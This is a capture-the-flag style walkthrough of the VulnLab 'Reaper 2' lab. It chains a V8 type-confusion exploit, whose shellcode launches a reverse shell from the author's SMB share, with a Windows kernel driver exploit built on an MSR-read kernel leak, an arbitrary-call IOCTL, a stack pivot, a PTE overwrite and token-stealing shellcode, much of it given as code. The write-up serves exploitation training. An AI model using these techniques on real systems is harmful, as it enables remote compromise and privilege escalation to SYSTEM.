# VulnLab Reaper 2 Walkthrough

## Introduction

[Reaper 2](https://www.vulnlab.com/machines) was the second lab recommended to me for my [OffSec Advanced Windows Exploitation (AWE)](https://www.offsec.com/courses/exp-401/) preperations. It was written by [xct](https://x.com/xct_de) and is part of the training and labs offered by [VulnLab](https://vunlab.com). The lab was rated **Insane** and it didn't disappoint!

The [wiki](https://wiki.vulnlab.com/guidance/insane/reaper2) for the lab gives several clues that definitely helped me on my journey to pwning it.

In this post I'm going to do something a little different. I am not going to post any full exploit code, and I am not going to write about the way I defeated the lab. I am going to write about how I would take on the lab now I know everything I have learned. So, this isn't going to be a walthrough you can follow, copy and paste a few things and beat the lab. It will act as a guide on how you can approach the lab, and write your own exploits to get `SYSTEM` access to **Reaper 2**.

I will be showing how this can all be done **without** using the clues given in in the [wiki](https://wiki.vulnlab.com/guidance/insane/reaper2). I won't be going in to great detail, for example how to attach a kernel debugger. The intention is that you can use this walkthrough as a guide when you get stuck. Let's go!

## Initial Access

### Reconnaissance

As with most labs you can start with an `nmap` scan to see what services are running on the target:

```
nmap reaper2.vulnlab.local -Pn -p- 
...
PORT      STATE SERVICE
80/tcp    open  http
135/tcp   open  msrpc
445/tcp   open  microsoft-ds
3389/tcp  open  ms-wbt-server
49668/tcp open  unknown
```

It's a Windows operating system, as expected. It has the **RPC** and **SMB** ports open and it also has a web service running on **HTTP**, and Terminal Services (**RDP**).

#### HTTP

Visiting the website we are presented with the following:

<img width="835" alt="Screenshot 2024-08-25 at 13 55 12" src="https://github.com/user-attachments/assets/91cf2196-e8a8-45e2-9890-b7c9250f3ea8">


From here we can input some JavaScript and the **V8** engine will process it and display the output. We can test this with an input of `print(version());`, and we will get an output of `12.2.0 (candidate)`. What is even more interesting is that if we look at the source code in the returned web page we will see:

```html
<!-- Completed: d8.exe --allow-natives-syntax --harmony-set-methods data.js -->
```

We have arbitrary JavaScript code input into **D8**. **D8** is a lightweight, standalone command-line interpreter for the **V8** JavaScript engine. It's primarily used for testing and debugging JavaScript code and **V8** itself. We also observe that the `--allow-natives-syntax --harmony-set-methods` arguments are being used.

#### SMB Shares

We should also enumerate the **SMB** shares on the target as these will help us to exploit the target.

```
 crackmapexec smb reaper2.vulnlab.local -u guest -p '' --shares
SMB         reaper2.vulnlab.local   445    REAPER2          [*] Windows 10.0 Build 20348 x64 (name:REAPER2) (domain:Reaper2) (signing:False) (SMBv1:False)
SMB         reaper2.vulnlab.local   445    REAPER2          [+] Reaper2\guest: 
SMB         reaper2.vulnlab.local   445    REAPER2          [+] Enumerated shares
SMB         reaper2.vulnlab.local   445    REAPER2          Share           Permissions     Remark
SMB         reaper2.vulnlab.local   445    REAPER2          -----           -----------     ------
SMB         reaper2.vulnlab.local   445    REAPER2          ADMIN$                          Remote Admin
SMB         reaper2.vulnlab.local   445    REAPER2          C$                              Default share
SMB         reaper2.vulnlab.local   445    REAPER2          IPC$            READ            Remote IPC
SMB         reaper2.vulnlab.local   445    REAPER2          software$       READ            software developement share
```

The `software$` looks interesting and we can connect to it using **smbclient**:

```
smbclient //reaper2.vulnlab.local/software$ 
Password for [WORKGROUP\root]:
Try "help" to get a list of possible commands.
smb: \> dir
  .                                   D        0  Sun Apr 28 20:31:48 2024
  ..                                DHS        0  Mon Apr 29 14:01:57 2024
  kernel                              D        0  Sun Apr 28 13:26:32 2024
  v8_debug                            D        0  Thu May  9 20:33:23 2024
  v8_release                          D        0  Sun Apr 28 10:39:11 2024

		6126847 blocks of size 4096. 2388806 blocks available
```

We should download copies of all the files we find, this includes `v8_debug.zip`, `v8_release`, `d8.exe`, `snapshot_blob.bin`, and `kernel32.dll`. We cannot download `Reaper.sys` but don't worry about that for now.

These files have been provided by `xct` to make debugging and writing your exploit easier. The **V8** and **D8** files mean you don't have to build the environment yourself, and the `kernel32.dll` file will come in handy later when we need to use some Win32 API offsets.

### Type Confusion Bug

It turns out there is a documented [explanation and walkthrough](https://h0meb0dy-me.translate.goog/entry/Issue-1510709-Type-confusion-in-Harmony-Set-methods-leads-to-RCE?_x_tr_sl=auto&_x_tr_tl=en&_x_tr_hl=en&_x_tr_pto=wapp) of a **type confusion** bug in this version of **D8** whilst running with the `--harmony-set-methods` argument. The bad news for us is the walkthrough is written for **Linux**.

Our challenge at this point is to convert the exploit so it will run against a **Windows Server 2022** target.

I recommed you spend a bit of time disecting the exploit and understanding how it works, this will really help when it comes to writing your own shellcode.

### Exploitation

I found a useful blog by [Jake Halon](https://jhalon.github.io/chrome-browser-exploitation-1/) which explained some important **V8** concepts when I was trying to understand it's internals: such as **Pointer Tagging** and **Pointer Compression**.

We can use most of the exploit documented by `h0meb0dy` but we do need to make some changes.

The first thing we need to consider is the fake array used in the exploit uses a `PACKED_DOUBLE_ELEMENTS` mapping, the value for this is different on the target. To find this we can run the following code **on the target** (using the Reaper Calculator):

```
d8> a = [1.1];
[1.1]
d8> %DebugPrint(a);
DebugPrint: 000000870004D9C5: [JSArray]
 - map: [...]
```

The second change is we need to write shellcode that will run on **Windows**. Essentially we need to change the `let wasmCode = new Uint8Array([...` line.

This was a painful process because of the JIT compiler restrictions outlined by `h0meb0dy`.

Essentially I wrote my shellcode in chunks of 8 bytes:

```masm
locate_kernel32:
    xor rcx, rcx                    ; zero out rcx
    nop                             ;
    nop                             ;
    nop                             ;
    jmp 0x0f                        ;

    add rcx, 0x60                   ; the _PEB is at an offset of 0x60 from gs
    nop                             ;
    nop                             ;
    jmp 0x17                        ;

    mov rax, gs:[rcx]               ; rax = _PEB
    nop                             ;
    nop                             ;
    jmp 0x1f                        ; 
...
```

**Notice** the jump instructions, the reason for these are outlined in the blog, and also note that two chunks cannot be identical or they will be optimised (essentially removed from your shellcode). The jump gap changes at certain points along, you will need to detect these as you are debugging.

I wrote a **python** script to take my `asm` and convert it to `wasm` (in text format `wat`): [asm2wasm.py](https://github.com/plackyhacker/misc-scripts/blob/main/awe-prep/asm2wasm.py). It's a bit of a Frankenstein, but it worked for me.

It does some checks on my `asm`, it then compiles it using `nasm`, it formats the assembly into a JavaScript array and builds and executes the `shellcode.js` file to output the `wasm` code:

```wat
(module
  (func (export "main")
    f64.const 1.6305244900842146e-270
    f64.const 1.6305241091952572e-270
    f64.const 1.6305237735001968e-270
    f64.const 1.6305238535635708e-270
...
```

I then used the [wat2wasm demo website]([https://webassembly.github.io/wabt/demo/wasm2wat/](https://webassembly.github.io/wabt/demo/wat2wasm/)) to convert my `wat` code to a `wasm` file. We can enter our text and download the `wasm` file.

Then we can use the follow **python** script to get the JavaScript array for our exploit:

```python
with open('..\\test.wasm', 'rb') as f:
    wasmCode = f.read()

wasmCode_arr = []
for c in wasmCode:
    wasmCode_arr.append(c)

print(str(wasmCode_arr))
```

Essentially my shellcode does the following:

- Locates the base address of `kernel32`.
- Resolves `WinExec`, this is done by examining the `kernel32.dll` file and finding the offset of `WinExec` then adding it to the base of `kernel32`:

```masm
; r15 = base address of kernel32
resolve_winexec:
    mov ebx, [offset]               ; mov the offset of WinExec in to ebx
    nop                             ; 
    jmp 0x14                        ;

    add rbx, r15                    ; add kernel base to WinExec offset
    mov r14, rbx                    ; mov the address of WinExec in to r14
    jmp 0x1c                        ; this is to defeat the JIT restrictions
```

- Pushes a string on the stack. This is an **SMB** share on my Kali host, with a reverse shell executable.
- Calls `WinExec` using 64-bit calling conventions.

I set up a **SMB** share on my Kali host. I hosted a reverse shell and executed my final JavaScript exploit in the Reaper Calculator:

```
nc -nvlp 4443
listening on [any] 443 ...
connect to [10.8.2.195] from (UNKNOWN) [10.10.102.190] 49712
Microsoft Windows [Version 10.0.20348.2402]
(c) Microsoft Corporation. All rights reserved.

C:\Windows\system32>
```

### Gathering Binaries

Now we are on the device we should take a copy of the custom driver `Reaper.sys` and `C:\Windows\System32\ntoskrnl.exe`. These can be copied to our **SMB** share on our Kali host.

We need the `Reaper.sys` file because it is a custom driver which we need to exploit to escalate our privileges and we need `ntoskrnl.exe` to find ROP gadgets to build a ROP chain.

## Privilege Escalation

**Note:** Our reverse shell from initial access is running at **Low Integrity**.

### Reverse Engineering

Our first step for privilege escalation is to reverse engineer the driver binary. We can load this in to **IDA Free**. We need to find the following:

- Symlink in order to communicate with the driver from user mode.
- Dispatch routine(s) to discover:
  - I/O Control Numbers to send data to the driver.
  - Possible vulnerailities.
 
Using **WinDbg** whilst debugging a target running the custom driver we can find the **dispatch routines** very easily:

```
1: kd> !drvobj \Driver\Reaper 2
Driver object (ffff828632002e30) is for:
 \Driver\reaper

DriverEntry:   fffff800161f5000	
DriverStartIo: 00000000	
DriverUnload:  fffff800161f1210	
AddDevice:     00000000	

Dispatch routines:
[00] IRP_MJ_CREATE                      fffff800161f1000	+0xfffff800161f1000
...
[0e] IRP_MJ_DEVICE_CONTROL              fffff800161f1020	+0xfffff800161f1020
```

The **Symlink** can be found in the **DriverEntry** function, and then following the link to the called function:

```
// lines 29 and 30
symLink = L"\\??\\Reaper";
v3 = IoCreateSymbolicLink(&SymbolicLinkName, &DeviceName);
```

We can now reverse engineer the `IRP_MJ_DEVICE_CONTROL` function using **IDA**, at offset `0x1020`. I have included my efforts below, including comments and the renaming of variales:

```c
NTSTATUS __fastcall ReaperDeviceControl(__int64 DeviceObject, __int64 Irp)
{
  __int64 CurrentStackLocation; // r9
  NTSTATUS status; // ebx
  int IoControlCode; // eax
  __int64 InputBuffer; // rsi
  _DWORD *PoolWithTag; // rax
  __int64 l_Irp; // [rsp+38h] [rbp+10h] BYREF


  // Local copy of the IRP
  l_Irp = Irp;

  // https://www.vergiliusproject.com/kernels/x64/windows-10/20h2/_IRP
  CurrentStackLocation = *(_QWORD *)(Irp + 0xB8);

  // STATUS_INVALID_DEVICE_REQUEST
  status = 0xC0000010;

  // https://www.vergiliusproject.com/kernels/x64/windows-10/20h2/_IO_STACK_LOCATION
  IoControlCode = *(_DWORD *)(CurrentStackLocation + 0x18);

  // IOCTL 0x80002003 does not execute this block
  if ( IoControlCode != 0x80002003 )
  {
    switch ( IoControlCode )
    {
      case 0x80002007:
        ExFreePoolWithTag(g_allocated_user_data, 'paeR');
MID_LABEL:
        status = 0;
        goto COMPLETE_REQUEST_LABEL;
      case 0x8000200B:

        // IOCTL 0x8000200B calls:
        // PsLookupThreadById
        // KeSetPriorityThread
        // ObfDereferenceObject
        status = PsLookupThreadByThreadId(*(unsigned int *)(g_allocated_user_data + 4), &l_Irp);
        if ( status >= 0 )
        {
          KeSetPriorityThread(l_Irp, *(unsigned int *)(g_allocated_user_data + 8));
          ObfDereferenceObject(l_Irp);

          // Whatever we put in buffer+16 will be called
          if ( *(_QWORD *)(g_allocated_user_data + 16) )
            _guard_dispatch_icall_fptr();
        }
        goto COMPLETE_REQUEST_LABEL;
      case 0x8000200F:

        // Only IOCTL 0x8000200F calls __readmsr
        **(_QWORD **)(g_allocated_user_data + 0x20) = __readmsr(*(_DWORD *)(g_allocated_user_data + 24));
        break;
      case 0x80002013:

        // IOCTL 0x80002013 only seems to call _writemsr - see below
        break;
      default:
        goto COMPLETE_REQUEST_LABEL;
    }

    // IOCTLs 0x8000200B, 0x8000200F, and 0x80002013 all call __writemsr 
    __writemsr(*(_DWORD *)(g_allocated_user_data + 0x18), **(_QWORD **)(g_allocated_user_data + 0x20));
  }

  // IOCTL 0x80002003 rejoins here

  // https://www.vergiliusproject.com/kernels/x64/windows-10/20h2/_IO_STACK_LOCATION
  // if InputBuffer == 0, status = 0xC000000D (STATUS_INVALID_PARAMETER)
  // otherwise status = 0xC0000010 (STATUS_INVALID_DEVICE_REQUEST)
  InputBuffer = *(_QWORD *)(CurrentStackLocation + 0x20);
  status = InputBuffer != 0 ? 0xC0000010 : 0xC000000D;

  // https://www.vergiliusproject.com/kernels/x64/windows-10/20h2/_IO_STACK_LOCATION
  // InputBufferLength is CurrentStackLocation + 0x10
  // Checks that the InputBufferLength is greater than 39
  if ( *(_DWORD *)(CurrentStackLocation + 0x10) < 40u )
    status = 0xC0000023;                        // STATUS_BUFFER_TOO_SMALL

  // Check MagicNumber
  if ( *(_DWORD *)InputBuffer == 0x6A55CC9E )
  {

    // Using NonPagedPool
    PoolWithTag = (_DWORD *)ExAllocatePoolWithTag(0LL, 40LL, 'paeR');
    g_allocated_user_data = (__int64)PoolWithTag;

    // Copies the InputBuffer into the Global Buffer
    if ( PoolWithTag )
    {

      // typedef struct ReaperData {
      //     DWORD Magic;            // userData + 0
      //     DWORD ThreadId;         // userData + 4
      //     DWORD Priority;         // userData + 8
      //     DWORD Padding;          // userData + 12
      //     QWORD unknown1;         // userData + 16
      //     DWORD msrRegister;      // userData + 24
      //     QWORD msrValue;         // userData + 32
      // } ReaperData;
      *PoolWithTag = *(_DWORD *)InputBuffer;    // +0x0 = MagicNumber
      *(_DWORD *)(g_allocated_user_data + 8) = *(_DWORD *)(InputBuffer + 8);// ThreadPriority
      *(_DWORD *)(g_allocated_user_data + 4) = *(_DWORD *)(InputBuffer + 4);// ThreadId
      *(_QWORD *)(g_allocated_user_data + 16) = *(_QWORD *)(InputBuffer + 16);// cfgCheck?
      *(_DWORD *)(g_allocated_user_data + 24) = *(_DWORD *)(InputBuffer + 24);// msrRegister
      *(_QWORD *)(g_allocated_user_data + 32) = *(_QWORD *)(InputBuffer + 32);// msrValue
      goto MID_LABEL;
    }
  }
COMPLETE_REQUEST_LABEL:

  // Irp->IoStatus.Status = status;
  *(_DWORD *)(Irp + 48) = status;

  // Irp->IoStatus.Information = 0;
  *(_QWORD *)(Irp + 56) = 0LL;
  IofCompleteRequest(Irp, 0LL);
  return status;
}
```

The interesting parts are:

```c
// lines 46 and 47
// IOCTL 0x8000200B
// Whatever we put in buffer+16 will be called
if ( *(_QWORD *)(g_allocated_user_data + 16) )
  _guard_dispatch_icall_fptr();
...
// line 53
// Only IOCTL 0x8000200F calls __readmsr
**(_QWORD **)(g_allocated_user_data + 0x20) = __readmsr(*(_DWORD *)(g_allocated_user_data + 24));        
```

Lines `46` and `47` allow us to execute code at an address we pass in our buffer at an offset of `16` bytes. This is good but the target Kernel is running **kASLR** and **DEP** so we need to run Kernel code and we need a Kernel address disclosure in order to do this.

Line `53` allows us to read a model-specific register (MSR). The register `0xC0000082` is the `IA32_LSTAR` register and points to the **syscall** function, which is at an offset of Kernel base. Effectively if you can read this, then you can work out what the base address of the kernel is on your target OS:

```
1: kd> ?nt!KiSystemCall64Shadow - nt
Evaluate expression: 11055488 = 00000000`00a8b180
```

**Note:** On the target you will need to find the offset of `KiSystemServiceHandler`. It is a pain, but it can be done. **Test this** in your lab, and test this on the target, without the correct offset you will BSOD the target/lab.

### Kernel Base Address Disclosure Bug

We can exploit the Kernel address disclosure bug using the following function:

```c
QWORD ReadMSR(HANDLE hDevice, DWORD msr)
{
    ReaperData userData;
    QWORD outputOfMSR = 0x0;

    userData.Magic = 0x6a55cc9e;
    userData.ThreadId = GetCurrentThreadId();
    userData.Priority = 0;
    userData.Padding = 0x41414141;
    userData.unknown1 = 0x0;
    userData.msrRegister = msr;
    userData.msrValue = (QWORD)&outputOfMSR;
    memset(&userData.MaliciousBuffer, 0x41, 0x10);

    unsigned char outputBuf[1024];
    memset(outputBuf, 0, sizeof(outputBuf));
    ULONG bytesRtn;

    // allocate
    BOOL result = DeviceIoControl(hDevice, IOCTL_ALLOCATE, (LPVOID)&userData, (DWORD)sizeof(struct ReaperData), outputBuf, 1024, &bytesRtn, NULL);

    // read msr
    memset(outputBuf, 0, sizeof(outputBuf));
    result = DeviceIoControl(hDevice, IOCTL_READMSR, (LPVOID)&userData, (DWORD)sizeof(struct ReaperData), outputBuf, 1024, &bytesRtn, NULL);

    // Free pool memory
    memset(outputBuf, 0, sizeof(outputBuf));
    result = DeviceIoControl(hDevice, IOCTL_FREE, (LPVOID)NULL, (DWORD)0, outputBuf, 1024, &bytesRtn, NULL);

    return outputOfMSR;
}
```

This gives us a Kernel base address with which to defeat **kASRL**. 

### Arbitrary Code Execution Bug

The execute bug is similar, although we use a different IOCTL and pass the address of the code we want to execute in the user buffer:

```c
void ExecuteGadget(HANDLE hDevice, QWORD address)
{
    ReaperData userData;

    userData.Magic = 0x6a55cc9e;
    userData.ThreadId = GetCurrentThreadId();
    userData.Priority = 0;
    userData.Padding = 0x41414141;
    userData.unknown1 = address;
    userData.msrRegister = 0x41414141;
    userData.msrValue = 0x4242424242424242;
    memset(&userData.MaliciousBuffer, 0x41, 0x10);

    unsigned char outputBuf[1024];
    memset(outputBuf, 0, sizeof(outputBuf));
    ULONG bytesRtn;

    // allocate
    BOOL result = DeviceIoControl(hDevice, IOCTL_ALLOCATE, (LPVOID)&userData, (DWORD)sizeof(struct ReaperData), outputBuf, 1024, &bytesRtn, NULL);

    // execute code
    memset(outputBuf, 0, sizeof(outputBuf));
    result = DeviceIoControl(hDevice, IOCTL_EXECUTE_GADGET, (LPVOID)&userData, (DWORD)sizeof(struct ReaperData), outputBuf, 1024, &bytesRtn, NULL);

    // Free pool memory
    memset(outputBuf, 0, sizeof(outputBuf));
    result = DeviceIoControl(hDevice, IOCTL_FREE, (LPVOID)NULL, (DWORD)0, outputBuf, 1024, &bytesRtn, NULL);
}
```

### Kernel Debugging

Initially you will need to develop and test your exploit in a lab environment, this is going to be different to the target. The ROP gadgets will have different offset addresses. My advice would be to build and test a working exploit in your own lab and then change the offsets in your exploit to match the target environment.

Whist I was debugging my exploit I found myself being unable to step through my ROP chain after I had pivoted the stack in to user space. I spent far too much time worrying about this and trying to understand what was wrong, this probably accounted for the vast majority of time I spent on this lab. I was thinking that my exploit was broken when in fact I just couldn't debug it effectively in **WinDbg**.

When debugging I would insert an `int3` ROP gadget into my chain and examine memory, registers etc. Then I would have to reload my VM snapshot and send the exploit again.

### Exploitation

I am not going to explain how to write ROP chains, and find ROP gadgets. If you are attempting this lab then you probably already know how to do this.

#### Stack Pivoting

We have one chance to execute code so what do we execute? We execute some code that will pivot onto a fake stack, created by us. Whet the code `ret`s our ROP chain on our fake stack will execute.

In our exploit code we create a fake stack:

```c
// stack pivoting gadgets/values
QWORD STACK_PIVOT_ADDR = 0xF6000000;
QWORD MOV_ESP = kernelBase + 0x23a227;  // mov esp, 0xF6000000; ret;

// prepare the new stack
QWORD stackAddr = STACK_PIVOT_ADDR - 0x1000;
LPVOID stack = VirtualAlloc((LPVOID)stackAddr, 0x14000, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

printf("[+] VirtualAlloc, allocated address: 0x%p\n", stack);

if (stack == 0x0)
{
  printf("[!] Error using VirtualAlloc. Error code: %u\n %u\n", GetLastError());
  return 1;
}

printf("[+] VirtualLock, address: 0x%p\n", stack);
if (!VirtualLock((LPVOID)stack, 0x14000)) {
 printf("[!] Error using VirtualLock. Error code: %u\n %d\n", GetLastError());
 return 1;
}
```

Notice that we use the `VirtualLock` Win32 API, according to Microsoft the API "Locks the specified region of the process's virtual address space into physical memory, ensuring that subsequent access to the region will not incur a page fault." This is important as our Kernel stack must be committed to physical memory.

We also have our first gadget that is going to pivot the stack to our user space allocation.

Next we write our ROP chain to this location:

```c
int index = 0;

// our rop chain
QWORD* rop = (QWORD*)((QWORD)STACK_PIVOT_ADDR);

// PTE owner bit flipping
*(rop + index++) = kernelBase + 0x919cf4;       // pop rcx; ret;
*(rop + index++) = (QWORD)alloc;
...
```

`alloc` is our shellcode in user space, this is the allocation that we are setting the owner bit as owned by the Kernel. The next section explains what we will write in our ROP chain.

After the ROP chain we `ret` to our user space shellcode:

```c
// ret to user space shellcode
*(rop + index++) = (QWORD)alloc;

// execute the rop chain
ExecuteGadget(hDevice, MOV_ESP);

system("cmd.exe");
```

Notice that we execute our `MOV_ESP` gadget (this is the code execution bug being triggered, which pivots the stack). We will be using token stealing shellcode to elevate our processes token to `SYSTEM`. The final command executes a new command prompt in this context.

#### PTE Table Overwrite

I decided to use the PTE Table Overwrite technique. This technique effectively plays by SMEP rules and marks the user space page as though it is owned by the Kernel. This allows us to build an exploit for the target without using the values in the wiki. :-)

I won't explain this technique, it has already been done by [Connor McGarr](https://twitter.com/33y0re) in his blog [Leveraging Page Table Entries for Windows Kernel Exploitation](https://connormcgarr.github.io/pte-overwrites/), what I will do is present the `asm` that is required to carry out this technique (convoluted based upon the ROP gadgets I found). You will have to find the ROP gadgets yourself and add them to your exploit:

```masm
pop rcx, [address of your shellcode]
call MiGetPteAddress				; you will need to resolve this address
mov r8, rax					; r8 = Shellcode's PTE address
mov r10, rax                                  	; r10 = Shellcode's PTE address
mov rax, qword[rax]				; rax = Shellcode's PTE value
mov r8, rax					; r8 = Shellcode's PTE value
mov rcx, r8                                     ; rcx = Shellcode's PTE value
pop rax, 0x4					;
sub rcx, rax					; rcx = modified PTE value
mov qword[r10], rax				;
wbinvd 						;
```

The `MiGetPteAddress` call is a little bit tricky in our ROP chain because we have to know what this is as an ofset of the Kernel Base address we disclosed. To do this I used my debuggee lab to display the code in **WinDbg**:

```
1: kd> uf nt!MiGetPteAddress
nt!MiGetPteAddress:
fffff800`10d42bc4 48c1e909        shr     rcx,9
fffff800`10d42bc8 48b8f8ffffff7f000000 mov rax,7FFFFFFFF8h
fffff800`10d42bd2 4823c8          and     rcx,rax
fffff800`10d42bd5 48b80000000080deffff mov rax,0FFFFDE8000000000h
fffff800`10d42bdf 4803c1          add     rax,rcx
fffff800`10d42be2 c3              ret
```

I loaded the **target** `ntoskrnl.exe` file into **IDA** and searched for the following sequence of bytes:

```
48 c1 e9 09 48 b8 f8 ff ff ff 7f
```

This returned several functions, upon examining them I found the function I was looking for, which revealed the offset:

<img width="436" alt="Screenshot 2024-08-25 at 11 20 55" src="https://github.com/user-attachments/assets/ce8da837-2955-4d9c-be92-987987933261">

#### User Space Shellcode

The user space shellcode is the one we will `ret` to when we have marked it as being owend by the Kernel. It is fairly standard token stealing shellcode:

```masm
BITS 64
SECTION .text
    SYS_PID equ 0x04
    PRCB_DATA equ 0x180
    CURRENT_THREAD equ 0x08
    APC_STATE equ 0x98
    PROCESS equ 0x20
    UNIQUE_PROCESS_ID equ 0x440
    ACTIVE_PROCESS_LINKS equ 0x448
    TOKEN equ 0x4b8

global main

main:
find_process:
    xor rax, rax                                  ; RAX = 0
    mov rax, [gs:rax+PRCB_DATA+CURRENT_THREAD]    ; RAX = *CurrentThread
    mov rax, [rax+APC_STATE+PROCESS]              ; RAX = *ApcState.Process
    mov r8, rax                                   ; R8 = *ApcState.Process
    mov r9, SYS_PID                               ; R9 = 0x4

next_system_process:
    mov r8, [r8+ACTIVE_PROCESS_LINKS]             ; R8 = ActiveProcessLinks.Flink (next process offset)
    sub r8, ACTIVE_PROCESS_LINKS                  ; R8 = *EPROCESS (next process)
    cmp [r8+UNIQUE_PROCESS_ID], r9                ; is EPROCESS.UniqueProcessId = R9 (0x4)
    jnz next_system_process                       ; if not then loop

found_system_process:
    mov rcx, [r8+TOKEN]                           ; RCX = *EPROCESS.Token
    and cl, 0xf0                                  ; Clear out _EX_FAST_REF RefCnt
    mov [rax+TOKEN], rcx                          ; *ApcState.Process in RAX (current) token
                                                  ; is replaced with the system one
recover:
    sub rdx, 0x18
    mov rsp, rdx
    ret
```

This code finds the `SYSTEM` process, steals the token, and assigns it to the running process. We need to compile this and insert this somewhere near the top of our exploit:

```c
// shellcode
unsigned char shellcode[] = {
  0x48, 0x31, 0xc0, 0x65, 0x48, 0x8b, 0x80, 0x88,
  0x01, 0x00, 0x00, 0x48, 0x8b, 0x80, 0xb8, 0x00,
  0x00, 0x00, 0x49, 0x89, 0xc0, 0x41, 0xb9, 0x04,
  0x00, 0x00, 0x00, 0x4d, 0x8b, 0x80, 0x48, 0x04,
  0x00, 0x00, 0x49, 0x81, 0xe8, 0x48, 0x04, 0x00,
  0x00, 0x4d, 0x39, 0x88, 0x40, 0x04, 0x00, 0x00,
  0x75, 0xe9, 0x49, 0x8b, 0x88, 0xb8, 0x04, 0x00,
  0x00, 0x80, 0xe1, 0xf0, 0x48, 0x89, 0x88, 0xb8,
  0x04, 0x00, 0x00, 0x48, 0x83, 0xea, 0x18, 0x48,
  0x89, 0xd4, 0xc3
};

// allocate memory for the shellcode
LPVOID alloc = VirtualAlloc(NULL, sizeof(shellcode), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
if (!alloc)
{
  printf("[!] Error using VirtualAlloc. Error code: %u\n", GetLastError());
  return 1;
}

printf("[+] Memory allocated: 0x%p\n", alloc);
// copy the shellcode in to the memory
RtlMoveMemory(alloc, shellcode, sizeof(shellcode));
printf("[+] Shellcode copied to: 0x%p\n", alloc);
```

The eagle eyed may have noticed how I recovered the stack. That is next!

#### Stack Recovery

If we don't recover the stack following our exploit in Kernel space it is inevitable that the OS will BSOD. We need somehow to recover back to execution flow in the driver and recover the stack to its former state. Whilst doing this we need to be mindful of [register volatility](https://learn.microsoft.com/en-us/cpp/build/x64-software-conventions?view=msvc-170#register-volatility-and-preservation).

While I was initially debugging my exploit I noticed that as the `_guard_dispatch_icall_fptr()` call was being made the `rdx` register always had a value `0x18` higher than `rsp`. Provided I didn't change the value in `rdx` I could use this register to restore `rsp` at the end of my shellcode.

## Final Thoughts

I learnt a stack of new techniques from this lab and expanded my knowledge in browser and Kernel exploitation. This lab is classed as **insane** for a reason, it isn't easy. I spent around 6 weeks from start to finish and I needed some nudges from other folk much cleverer than me. If you approach the challenge in small chunks you can also beat **Reaper 2**!

Thanks to `xct` for a great learning experience!

If you have any questions feel free to contact me on Discord: `plackyhacker#1905`.

